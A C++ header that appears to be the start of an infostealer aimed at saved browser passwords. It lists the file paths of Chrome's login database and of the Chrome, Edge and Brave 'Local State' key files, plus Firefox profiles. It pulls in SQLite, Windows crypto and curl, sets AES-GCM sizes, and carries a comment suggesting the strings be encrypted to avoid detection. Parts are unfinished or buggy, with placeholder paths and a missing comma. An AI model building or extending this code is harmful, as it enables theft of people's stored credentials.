
#define FIREFOX_PATH "\\Mozilla\\Firefox\\Profiles\\"

#include "sqlite/sqlite3.h"

#include <vector>
#include <Windows.h>
#include <shlobj_core.h>
#include <iostream>
#include <curl/curl.h>
#include <wincrypt.h>

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Bcrypt.lib")



#define db_tmp ".//db_tmp"
#define IV_SIZE 12
#define TAG_SIZE 16

const wchar_t* file_path = L"C:\\Opera\\test_final.txt";
const char* file_path_char = "C:\\Opera\\test_final.txt";



const int NUMBER_OF_BROWSERS = 4;

enum BROWSER
{
	CHROME, EDGE, BRAVE,  // chromium
	FIREFOX
};



const std::string LOGIN_DATA_PATHS[NUMBER_OF_BROWSERS] =
{
	"\\Google\\Chrome\\User Data\\Default\\Login Data",
	"1",
	"2",
	"\\Mozilla\\Firefox\\Profiles\\"
};

const std::string LOCAL_STATE_PATHS[NUMBER_OF_BROWSERS] =
{
		"\\Google\\Chrome\\User Data\\Local State",
		"\\Microsoft\\Edge\\User Data\\Local State",
		"\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
		"\\"
	// You might wanna encrypt these
};